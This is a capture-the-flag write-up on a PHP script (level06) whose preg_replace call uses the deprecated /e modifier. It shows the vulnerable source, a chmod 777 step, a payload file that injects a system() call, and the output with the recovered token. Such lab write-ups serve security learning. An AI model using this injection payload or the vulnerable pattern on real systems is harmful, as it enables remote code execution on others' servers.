# CTF Report — Level06 PHP Script Exploitation (English, detailed)

---

## Overview

This report documents the exploitation of `level06.php`, a PHP script that processes input files using `preg_replace` with the deprecated `/e` modifier, allowing **remote code execution**. The steps below follow your original procedure exactly, with no changes to commands or outputs.

---

## Script Analysis

The content of `level06.php`:

```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```

**Key points:**

* The `/e` modifier in `preg_replace("/(\[x (.*)\])/e", ...)` evaluates the replacement string as PHP code.
* Arbitrary code can be executed via input file content.
* The script reads the file passed as `$argv[1]`.

---

## Exploitation Steps

### 1. Setting up permissions

```bash
chmod 777 .
```

> Ensures the script can execute without permission issues.

---

### 2. Creating the payload file

```bash
echo '[x {${system(getflag)}}]' > a
```

> Injects a command to execute `getflag` via the vulnerable `/e` evaluation.

---

### 3. Running the script with the payload

```bash
./level06 a
```

Output:

```
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

> Despite the PHP notices, the `getflag` command is successfully executed and the token is returned.

---

## Observed Flag

```
wiok45aaoguiboiki2tuin6ub
```
